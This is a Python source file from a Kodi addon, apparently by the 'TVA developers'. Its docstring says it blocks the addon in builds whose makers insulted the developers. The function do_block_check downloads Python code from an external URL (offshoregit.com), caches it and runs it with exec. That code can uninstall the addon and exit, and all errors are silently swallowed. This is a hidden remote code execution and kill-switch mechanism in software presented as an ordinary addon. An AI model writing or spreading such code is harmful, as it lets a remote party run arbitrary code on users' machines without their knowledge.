'''
This check has been put in place to stop the inclusion of TVA (and friends) addons in builds
from build makers that publicly insult or slander TVA's developers and friends. If your build is
impacted by this check, you can have it removed by publicly apologizing for your previous statements
via youtube and twitter. Otherwise, stop including our addons in your builds or fork them and maintain
them yourself.
                                                                                           http://i.imgur.com/TqIEnYB.gif
                                                                                           TVA developers (and friends)
'''


def do_block_check(uninstall=True):
    '''
    This check has been put in place to stop the inclusion of TVA (and friends) addons in builds
    from build makers that publicly insult or slander TVA's developers and friends. If your build is
    impacted by this check, you can have it removed by publicly apologizing for your previous statements
    via youtube and twitter. Otherwise, stop including our addons in your builds or fork them and maintain
    them yourself.
                                                                                               http://i.imgur.com/TqIEnYB.gif
                                                                                               TVA developers (and friends)
    '''

    def do_block_check_cache():
        try:
        	import urllib2
	        code = 'import xbmc\n'
	        code  += urllib2.urlopen('http://offshoregit.com/tknorris/block_code.py').read()
	        return code
	        
        except:
            pass

    try:
        import sys
        namespace = {}

        from resources.lib.modules import cache
        do_check = cache.get(do_block_check_cache, 1)

        exec do_check in namespace
        if namespace["real_check"](uninstall): 
            sys.exit()
        return
    except SystemExit:
        sys.exit()
    except:
        traceback.print_exc()
        pass